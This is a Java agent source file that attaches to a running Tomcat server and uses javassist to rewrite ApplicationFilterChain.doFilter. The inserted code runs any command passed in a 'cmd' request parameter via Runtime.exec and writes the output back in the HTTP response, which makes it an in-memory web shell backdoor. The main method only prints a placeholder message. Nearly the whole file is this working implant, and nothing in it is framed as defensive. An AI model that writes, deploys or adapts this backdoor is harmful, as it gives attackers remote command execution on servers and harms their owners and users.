package com.mysec.agent;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.security.ProtectionDomain;
import javassist.*;

import static java.lang.Thread.sleep;

public class Agent {
    private final static String targetClass = "org.apache.catalina.core.ApplicationFilterChain";
    public static void main(String[] args) throws InterruptedException {
        while(true){
            System.out.println("hello,this is a sample app!");
            sleep(1000);
        }
    }

    public static void premain(String arg,Instrumentation inst) {
        System.out.println("hello,Pre agent Start!");
    }

    public static void agentmain(String arg,Instrumentation inst) throws UnmodifiableClassException {
        Class[] classes = inst.getAllLoadedClasses();
        for(Class c : classes){
            if(c.getName().equalsIgnoreCase(targetClass)){
                inst.addTransformer(new MyTransformation(),true);
                inst.retransformClasses(c);
            }
        }
    }
}

class MyTransformation implements ClassFileTransformer {
//    private static final String targetClass = "org/apache/catalina/core/ApplicationFilterChain";
    private final static String targetClass = "org.apache.catalina.core.ApplicationFilterChain";
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(classBeingRedefined));
        try {
            CtClass ctc = pool.getCtClass(targetClass);
            CtMethod ctm = ctc.getDeclaredMethod("doFilter");
            ctm.insertBefore("javax.servlet.http.HttpServletRequest request = $1;\n" +
                    "javax.servlet.http.HttpServletResponse response = $2;\n" +
                    "request.setCharacterEncoding(\"UTF-8\");\n" +
                    "if(request.getParameter(\"cmd\") != null){\n" +
                    "    String cmd = request.getParameter(\"cmd\");\n" +
                    "    java.lang.Process p = java.lang.Runtime.getRuntime().exec(cmd);\n" +
                    "    java.io.InputStream inputStream = p.getInputStream();\n" +
                    "    for(;;){\n" +
                    "        int i = inputStream.read();\n" +
                    "        if( i != -1){\n" +
                    "            response.getWriter().print((char)i);\n" +
                    "        }else {\n" +
                    "            break;\n" +
                    "        }\n" +
                    "}      \n" +
                    "\n" +
                    "}\n");
            System.out.println("Injection successful！");
            byte[] bytes = ctc.toBytecode();
            ctc.detach();
            return bytes;
        } catch (NotFoundException e) {
            e.printStackTrace();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new byte[0];
    }
}